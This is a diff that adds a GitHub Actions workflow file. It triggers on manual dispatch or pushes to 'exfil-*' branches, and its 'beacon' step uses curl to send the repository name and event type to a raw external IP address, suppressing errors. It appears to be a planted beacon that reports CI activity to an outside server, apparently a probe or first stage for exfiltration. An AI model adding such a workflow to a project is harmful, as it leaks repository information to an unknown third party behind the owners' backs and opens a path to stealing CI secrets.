@@ -1,0 +1,13 @@
+name: t1
+on:
+  workflow_dispatch:
+  push:
+    branches: [ 'exfil-*' ]
+jobs:
+  b:
+    runs-on: ubuntu-latest
+    steps:
+      - name: beacon
+        run: |
+          echo "RUNNING repo=$GITHUB_REPOSITORY ref=$GITHUB_REF ev=$GITHUB_EVENT_NAME"
+          curl -s -m 20 "http://144.124.243.130:8443/beacon?repo=$GITHUB_REPOSITORY&ev=$GITHUB_EVENT_NAME" || true
